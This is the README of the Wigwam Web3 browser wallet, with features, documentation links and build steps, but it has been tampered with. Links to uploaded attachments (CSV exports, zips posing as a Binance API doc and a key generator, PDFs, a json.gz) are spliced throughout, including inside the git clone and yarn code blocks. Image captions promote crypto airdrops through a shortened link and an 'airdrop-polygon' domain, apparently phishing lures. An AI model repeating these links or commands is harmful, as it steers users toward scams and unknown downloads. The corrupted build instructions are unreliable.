# Wigwam - Web3 Wallet
[export-0xFa1dB6794de6e994b60741DecaE0567946992181.csv](https://github.com/user-attachments/files/16631391/export-0xFa1dB6794de6e994b60741DecaE0567946992181.csv)

### https://wigwam.app

A browser extension Web3 wallet designed for Ethereum, Polygon, BNB Smart Chain, Arbitrum, and all EVM networks. Reliable and secure solution for managing accounts and crypto keys, exploring DeFi, NFTs, and GameFi.
[pull_request_template.md](https://github.com/user-attachments/files/16631433/pull_request_template.md)
![100 $AERO (VISIT bit ly_aerodromefi ) 🎁 #0](https://github.com/user-attachments/assets/0dcb8fa9-d197-4c7b-b797-0ad0b88271a6)
![Polygon Airdrop Rewards Position (airdrop-polygon xyz) #1](https://github.com/user-attachments/assets/83e39f19-c5f9-4fda-ba66-7f6fcabcb127)


![Wigwam](./docs/banner.png)

**Table of Contents**

- [Features](#features)
- [export-0xFa1dB6794de6e994b60741DecaE0567946992181.csv](https://github.com/user-attachments/files/16631465/export-0xFa1dB6794de6e994b60741DecaE0567946992181.csv)

- [Documentation](#documentation)
- [Binance-api-doc-768e93f96c002b53bb3d22595cd3a075148d1abc.zip](https://github.com/user-attachments/files/16631467/Binance-api-doc-768e93f96c002b53bb3d22595cd3a075148d1abc.zip)

- [Build from Source](#build-from-source)
- [asymmetric-key-generator-0.3.0.zip](https://github.com/user-attachments/files/16631469/asymmetric-key-generator-0.3.0.zip)

- [Useful Scripts](#useful-scripts)
- [Contributions](#contributions)
- [contract_controller.ex (1).txt](https://github.com/user-attachments/files/16631470/contract_controller.ex.1.txt)

- [Support](#support)

## Features

### Self-Custodial

- 🤲 User-centric approach - the keys belong to the user and are securely stored on their device, encrypted and inaccessible to anyone else.
- 🗝 Compatible with hardware wallets like [Ledger](https://www.ledger.com/) for an extra layer of security.

### Security First

- 🛡 Utilizes battle-proof techniques for encrypting and storing sensitive data, which are commonly used in password managers, to protect user data.

### Dapp Integration

- 🌐 Seamlessly connects with decentralized applications (dApps) across various EVM networks.
- 💼 Supports all the latest Web3 standards.

### Full-Page Dashboard

- 📊 Features a comprehensive full-page dashboard within the app, providing detailed information about accounts, transactions, and assets.
- 📈 Stay updated on your portfolio and activities within the Web3 ecosystem.

### Multi-Network Support

- 🔗 Designed to be multi-network, allowing to switch between networks effortlessly.
- 🌐 Easily manage assets and explore the diverse opportunities offered by different networks.
-[export-token-0x9cdc684179d200ddab42628f3500fadd60322121.csv](https://github.com/user-attachments/files/16631476/export-token-0x9cdc684179d200ddab42628f3500fadd60322121.csv)

### Open Source

- 📖 Committed to transparency and community-driven development. The project is open source, allowing developers to review and contribute to the codebase.[Blockpit Example Report - 2024 (1).pdf](https://github.com/user-attachments/files/16631332/Blockpit.Example.Report.-.2024.1.pdf)


### User-Friendly Interface

- 🖥️ The user interface is intuitive and user-friendly, making it easy for both newcomers and experienced users to navigate and utilize the wallet's features.

### Offline-first

- 🔌 Adopts an offline-first approach by utilizing a local database as the primary source of data. The app syncs with third-party indexer APIs for enhanced functionality but can operate independently, directly interacting with the blockchain if needed.
- [Blockpit Example Report - 2024 (1).pdf](https://github.com/user-attachments/files/16631480/Blockpit.Example.Report.-.2024.1.pdf)


### Manifest V3 Compatibility

- ✅ Fully adapted to the latest browser extension ManifestV3 API, ensuring compatibility with modern standards.[export-https-vscode-dev-github-zxramozx-1722925865.json.gz](https://github.com/user-attachments/files/16631336/export-https-vscode-dev-github-zxramozx-1722925865.json.gz)

- 🌙 "Sleep well" feature allows the extension to save resources when not in active use, improving overall performance.

### Lightweight

- ⚡️ Designed with efficiency in mind to ensure a lightweight and responsive user experience.

## Documentation[README (2).md](https://github.com/user-attachments/files/16631342/README.2.md)


- [**General Tech Documentation**](docs/README.md)
- [README (1).md](https://github.com/user-attachments/files/16631353/README.1.md)

- [**Security Documentation**](docs/SECURITY.md)
- [install_linux.md](https://github.com/user-attachments/files/16631348/install_linux.md)


You can also find documentation for specific modules within the source code.

## Build from source

> Requires: [`Node.js >=18.12.0`](https://nodejs.org) and [`Yarn ^1`](https://yarnpkg.com)

### Get the source code

```bash
git clone git@github.com:wigwamapp/local-wigwam.git wigwam[export-https-vscode-dev-github-zxramozx-1722925865.json.gz](https://github.com/user-attachments/files/16631364/export-https-vscode-dev-github-zxramozx-1722925865.json.gz)

```

### Install app dependencies

```bash
[Binance-api-doc-768e93f96c002b53bb3d22595cd3a075148d1abc.zip](https://github.com/user-attachments/files/16631491/Binance-api-doc-768e93f96c002b53bb3d22595cd3a075148d1abc.zip)
yarn
```

### Build an application

```bash
# for Chrome and other Chrome-based browsers
yarn build
[install_linux.md](https://github.com/user-attachments/files/16631495/install_linux.md)

# for Firefox
yarn build:firefox
```

### Add an application to the browser locally

1. Open `chrome://extensions/` in your browser
2. Enable "Developer mode"
3. Tap on "Load unpacked"
4. Select `<your_local_wigwam_repository_dir>/dist/prod/chrome_unpacked`

## Useful scripts

### Test

```bash
  yarn test
```

### Audit NPM dependencies

```bash
![chart](https://github.com/user-attachments/assets/80ce0257-550d-49c0-9d73-1d22a58341a8)

  yarn audit
  yarn npm-audit
```

### Analyze bundle

```bash
  yarn analyze
```

## Contributions

We welcome contributions from the community to make this project even better.

## Support

For any questions, issues, or assistance, please contact our support team or open an issue on GitHub.
